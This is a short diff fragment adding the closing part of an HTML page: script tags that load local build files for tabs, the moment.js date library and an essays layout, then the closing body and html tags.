+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
